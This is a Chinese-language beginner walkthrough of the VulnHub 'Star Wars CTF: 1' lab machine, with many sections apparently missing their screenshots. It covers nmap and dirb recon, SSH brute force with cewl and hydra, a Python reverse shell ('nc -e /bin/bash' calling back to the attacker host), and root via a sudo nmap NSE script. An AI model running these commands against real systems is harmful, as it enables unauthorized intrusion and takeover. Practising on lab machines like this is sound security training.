# 原创
：  VulnHub渗透测试实战靶场 - STAR WARS CTF: 1

# VulnHub渗透测试实战靶场 - STAR WARS CTF: 1

#### VulnHub渗透测试实战靶场 - STAR WARS CTF: 1

## 题目描述

```
Star Wars themed CTF for beginners

This works better with VirtualBox rather than VMware

```

## 环境下载

> 



## NULLY CYBERSECURITY: 1靶机搭建

> 

- 将下载好的靶机环境，导入 VritualBox，设置为 Host-Only 模式- 将 VMware 中桥接模式网卡设置为 VritualBox 的 Host-only


> 



## 渗透测试

### 信息搜集

> 
用 Nmap 扫描一下目标靶机的端口信息：`sudo nmap -sS -A -Pn 192.168.56.111`，发现开放了 `22、80` 两个端口


> 
用 dirb 扫描一下 80 端口 web 目录：`dirb http://192.168.56.111`


### 漏洞挖掘

> 



```
Why does the Jedi Order keep checking the robots.txt file.
Might take a look at /r2d2
He is the real OG. 

```

> 



> 



> 



> 



### getshell

> 



### 提权

> 



> 



```
cewl http://192.168.56.111/r2d2 &gt; pass.txt

```

> 



```
hydra -l skywalker -P pass.txt -f -V 192.168.56.111 ssh

```

> 



> 



```
import os 
os.system("nc -e /bin/bash 192.168.56.102 1234")

```

> 



```
SHELL=/bin/bash script -q /dev/null

```

> 



```
echo "os.execute('/bin/sh')" &gt; /tmp/root.nse
sudo /usr/bin/nmap --script=/tmp/root.nse

```
